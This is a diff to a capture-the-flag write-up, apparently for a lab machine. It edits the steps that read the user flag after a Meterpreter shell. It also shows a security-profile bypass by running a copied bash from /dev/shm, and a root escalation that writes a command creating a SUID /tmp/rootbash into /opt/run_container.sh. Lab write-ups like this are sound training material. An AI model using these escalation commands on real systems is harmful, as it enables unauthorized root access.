@@ -104,20 +104,14 @@ run
 
 ![Meterpreter](screenshots/07-meterpreter.png)
 
-Meterpreter session opened as `www-data`.
-
-### Shell as www-data
+Meterpreter session opened as `www-data`. After getting the shell we grab the user flag:
 
 ```bash
-shell
-id
+cd /home/think
+cat user.txt
 ```
 
-![www-data](screenshots/08-www-data.png)
-
-```
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-```
+![User flag](screenshots/08-user.txt.png)
 
 **User flag:**
 
@@ -183,6 +177,7 @@ Profile denies writes to `/opt`, `/tmp`, `/dev/shm`, `/home` for the `ash` shell
 cd /dev/shm
 cp /bin/bash .
 ./bash -p
+ls -la /opt
 ```
 
 ![Bypass](screenshots/13-bypass.png)
@@ -197,6 +192,8 @@ The new `bash` process is **not covered** by the `ash` profile → `/opt` is now
 echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /opt/run_container.sh
 /usr/sbin/run_container
 /tmp/rootbash -p
+id
+cat /root/root.txt
 ```
 
 ![Root](screenshots/14-root.png)
